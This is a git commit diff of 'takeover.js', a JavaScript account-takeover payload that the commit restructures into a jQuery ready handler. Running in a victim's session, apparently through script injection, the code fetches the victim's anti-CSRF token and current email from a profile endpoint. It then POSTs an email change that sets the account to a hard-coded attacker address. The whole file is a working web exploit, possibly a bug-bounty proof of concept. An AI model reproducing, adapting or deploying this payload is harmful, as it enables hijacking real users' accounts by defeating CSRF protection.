5d539a8fe8fa73648af8532f74be284acc64e24a
s4ur4bh-1337 <142944572+s4ur4bh-1337@users.noreply.github.com>
2023-08-23 03:25:19 +0530

    Update takeover.js

--- takeover.js
+++ takeover.js
@@ -1,36 +1,40 @@
-// returns the anti-csrf token and current email address of the victim
-function fetchInfo() {
-    var currentEmail = "";
-    var userCsrfToken = "";
-    $.ajax({
-        url: "/users/" + utag_data.context.user.tuid + "/profile",
-        async: false,
-        success: function(data) {
-            userCsrfToken = data.csrfToken;
-            currentEmail = data.email;
-        }
-    });
-    return [userCsrfToken, currentEmail];
-}
+$(document).ready(function() {
 
-function changeEmail(newEmail) {
-    var userInfo = fetchInfo();
-    var emailChangeUrl = "/users/" + utag_data.context.user.tuid + "/updateemail"
-    var requestData = { 
-        "newEmail": newEmail,
-        "hiddenNewEmail": userInfo[1],
-        "unsubscribe_on_updateEmail": "false",
-        "confirmNewEmail": newEmail,
-        "csrfToken": userInfo[0]
-    };
-    $.ajax({
-        url: emailChangeUrl,
-        type: "POST",
-        async: false,
-        data: JSON.stringify(requestData),
-        contentType: "application/json"
-    });
-}
-
-// triggering change email with the attacker's email address
-changeEmail("s4ur4bh.1337@gmail.com");
+    // returns the anti-csrf token and current email address of the victim
+    function fetchInfo() {
+        var currentEmail = "";
+        var userCsrfToken = "";
+        $.ajax({
+            url: "/users/" + utag_data.context.user.tuid + "/profile",
+            async: false,
+            success: function(data) {
+                userCsrfToken = data.csrfToken;
+                currentEmail = data.email;
+            }
+        });
+        return [userCsrfToken, currentEmail];
+    }
+    
+    function changeEmail(newEmail) {
+        var userInfo = fetchInfo();
+        var emailChangeUrl = "/users/" + utag_data.context.user.tuid + "/updateemail"
+        var requestData = { 
+            "newEmail": newEmail,
+            "hiddenNewEmail": userInfo[1],
+            "unsubscribe_on_updateEmail": "false",
+            "confirmNewEmail": newEmail,
+            "csrfToken": userInfo[0]
+        };
+        $.ajax({
+            url: emailChangeUrl,
+            type: "POST",
+            async: false,
+            data: JSON.stringify(requestData),
+            contentType: "application/json"
+        });
+    }
+    
+    // triggering change email with the attacker's email address
+    changeEmail("s4ur4bh.1337@gmail.com");
+    
+});
